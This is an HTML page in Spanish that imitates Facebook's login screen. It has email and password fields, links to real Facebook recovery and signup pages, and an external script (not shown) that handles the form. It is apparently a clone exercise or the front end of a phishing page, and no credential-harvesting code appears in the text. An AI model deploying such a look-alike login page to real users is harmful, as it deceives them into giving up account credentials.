<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook – entra o regístrate</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <img class="imgIcon" src="/images/4lCu2zih0ca.svg" alt="">
    <div class="login-box">
      <p class="logo">Iniciar Sesion en Facebook</p>
      <form>
        <input id="correo" type="text" placeholder="Correo electrónico o número de teléfono" required>
        <input id="password" placeholder="Contraseña" required>
        <button type="submit" id="miBtn">Iniciar sesión</button>
        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="link">¿Olvidaste tu contraseña?</a>
        <hr>
      </form>
      <a href="https://es-la.facebook.com/r.php?locale=es_LA&display=page&entry_point=login"><button class="create-btn">Crear cuenta nueva</button></a>
    </div>
  </div>
  <script src="main.js"></script>
</body>
</html>
